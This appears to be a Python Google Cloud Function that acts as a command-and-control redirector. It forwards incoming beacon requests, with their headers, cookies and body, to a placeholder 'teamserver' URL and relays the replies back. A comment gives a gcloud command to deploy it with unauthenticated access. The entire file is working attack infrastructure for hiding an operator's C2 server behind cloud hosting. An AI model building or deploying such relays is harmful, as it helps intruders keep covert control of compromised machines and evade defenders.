from flask import make_response
import functions_framework
import requests

# to deploy this function, run: `gcloud functions deploy <your function name> --runtime python310 --trigger-http --allow-unauthenticated`
@functions_framework.http
def c2Post(request): 

    teamserver_url = 'http://teamserver.url/'      # this has to end in a '/' (slash)   
    beacon_endpoint = "c2Post"                     # this is the bit after the first '/'

    post_url = teamserver_url + beacon_endpoint
    header_dict = dict(request.headers)            # this grabs the headers from the request
    cookies_dict = dict(request.cookies)           # this grabs the cookies from the request
    post_data = request.get_data()                 # this grabs the data from the request body

    res = requests.post(                           # forwards the request to the teamserver
                         url=post_url,             
                         data=post_data,
                         headers=header_dict, 
                         cookies=cookies_dict
                        )
    response = make_response(res.content)          # grabs response from the teamserver 
    return response                                # returns the response to the client                                                                            
